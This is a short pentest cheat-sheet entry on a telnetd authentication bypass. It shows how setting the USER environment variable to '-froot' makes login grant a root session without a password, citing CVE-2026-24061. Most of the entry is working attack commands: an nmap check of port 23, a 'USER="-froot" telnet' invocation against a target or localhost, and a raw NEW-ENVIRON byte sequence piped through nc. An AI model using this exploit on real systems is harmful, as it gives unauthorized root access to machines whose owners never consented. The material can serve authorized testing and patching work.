# inetd Telnet Authentication Bypass via USER env var

`in.telnetd` (inetd/xinetd variant) passes the `USER` environment variable directly to PAM/login. By sending a `USER` value of `-froot`, telnet invokes `login -froot`, which treats it as a pre-authenticated login for root (the `-f` flag bypasses password checking).

```bash
# Check if port 23 (telnet) is open
nmap -p23 <TARGET>

# Connect and set USER env (telnet protocol ENV option):
# Most telnet clients send the local USER env var automatically
USER="-froot" telnet <TARGET>
# If already inside a container/box where localhost telnet is running:
USER="-froot" telnet 127.0.0.1
```

Manual with `nc` (raw):
```bash
# Craft telnet NEW-ENVIRON option:
printf '\xff\xfa\x27\x00\x55\x53\x45\x52\x01\x2d\x66\x72\x6f\x6f\x74\xff\xf0' | nc <TARGET> 23
```

Affected: old `telnetd` versions that don't sanitize the `USER` env value before passing to `login`. The CVE varies by vendor; the technique appears in CVE-2026-24061 and related telnetd auth bypass reports.
